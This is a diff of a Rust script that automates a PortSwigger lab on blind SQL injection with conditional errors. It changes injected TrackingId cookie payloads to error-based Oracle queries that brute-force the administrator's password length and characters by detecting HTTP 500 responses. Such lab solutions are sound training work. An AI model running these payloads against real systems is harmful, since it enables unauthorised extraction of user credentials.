@@ -2,12 +2,12 @@
 *
 * Author: Ahmed Elqalawy (@elqal3awii)
 *
-* Date: 21/9/2023
+* Date: 23/9/2023
 *
-* Lab: Blind SQL injection with conditional responses
+* Lab: Blind SQL injection with conditional errors
 *
 * Steps: 1. Inject payload into 'TrackingId' cookie to determine the length of
-*           administrator's password based on conditional responses
+*           administrator's password based on conditional errors
 *        2. Modify the payload to brute force the administrator's password
 *        3. Fetch the login page
 *        4. Extract csrf token and session cookie
@@ -38,7 +38,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a49004903c7da8b84da9c8a00f000b5.web-security-academy.net";
+    let url = "https://0aab005b04215740848c3c9b00680008.web-security-academy.net";
     // build the client used in all subsequent requests
     let client = build_client();
 
@@ -217,7 +217,7 @@ fn determine_password_length(client: &Client, url: &str) -> usize {
         io::stdout().flush();
         // payload to determine password length
         let payload = format!(
-            "' or length((select password from users where username = 'administrator')) = {} -- -",
+            "' UNION SELECT CASE WHEN (length((select password from users where username = 'administrator')) = {}) THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- -",
             i
         );
         // fetch the page with the injected payload
@@ -231,12 +231,8 @@ fn determine_password_length(client: &Client, url: &str) -> usize {
                     .red()
             ));
 
-        let mut body = injection.text().unwrap();
-        // extract the name of users table
-        let welcom_text = extract_pattern("Welcome back!", &body);
-
-        // if the welcome text is returned in the response
-        if welcom_text.is_some() {
+        // if a char is found which make the condition true and cause the server to return error
+        if injection.status().as_u16() == 500 {
             println!(
                 " [ {} {} ]",
                 "Correct length:".white(),
@@ -267,15 +263,15 @@ fn brute_force_password(client: &Client, url: &str, password_length: usize) -> S
             );
             io::stdout().flush();
             // payload to brute force password
-            let brute_force_payload = format!(
-            "' or substring((select password from users where username = 'administrator'), {}, 1) = '{}' -- -",
-            position,
-            character
-        );
+            let payload = format!(
+                "' UNION SELECT CASE WHEN (substr((select password from users where username = 'administrator'), {}, 1) = '{}') THEN TO_CHAR(1/0) ELSE NULL END FROM dual-- -",
+                position,
+                character
+            );
             // fetch the page with the injected payload
-            let characters_injection = client
+            let injection = client
                 .get(format!("{url}/filter?category=Pets"))
-                .header("Cookie", format!("TrackingId={brute_force_payload}"))
+                .header("Cookie", format!("TrackingId={payload}"))
                 .send()
                 .expect(&format!(
                 "{}",
@@ -283,13 +279,8 @@ fn brute_force_password(client: &Client, url: &str, password_length: usize) -> S
                     .red()
             ));
 
-            // body of the response
-            let mut body = characters_injection.text().unwrap();
-            // extract the name of users table
-            let welcom_text = extract_pattern("Welcome back!", &body);
-
-            // if the welcome text is returned in the response
-            if welcom_text.is_some() {
+            // if a char is found which make the condition true and cause the server to return error
+            if injection.status().as_u16() == 500 {
                 correct_password.push(character);
                 print!(
                     " [ {} {} ]",
